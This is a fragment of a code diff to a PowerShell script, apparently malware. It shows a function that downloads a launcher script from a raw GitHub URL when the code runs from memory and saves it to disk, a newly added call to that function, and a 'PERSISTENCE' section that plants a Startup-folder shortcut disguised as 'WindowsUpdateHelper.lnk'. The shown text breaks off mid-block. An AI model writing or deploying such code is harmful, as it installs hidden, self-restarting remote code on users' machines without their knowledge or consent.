@@ -14,24 +14,21 @@ function Save-ScriptToDisk {
     param([string]$Destination)
     $dir = Split-Path $Destination -Parent
     if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
-    
-    # If running from memory (no current path), download from GitHub
     if (-not $currentPath -or $currentPath -eq '') {
         try {
             $rawUrl = "https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/refs/heads/main/assets/launcher.ps1"
             (New-Object Net.WebClient).DownloadFile($rawUrl, $Destination)
         } catch {
-            # Fallback: Try alternate URL or exit
             exit
         }
     } else {
-        # Running from disk, just copy
         Copy-Item -Path $currentPath -Destination $Destination -Force
     }
     return $Destination
 }
+$scriptPath = Save-ScriptToDisk $localPath
 
-# === PERSISTENCE: Startup LNK ONLY ===
+# === PERSISTENCE: Startup LNK ===
 $lnkPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdateHelper.lnk"
 if (-not (Test-Path $lnkPath)) {
     try {
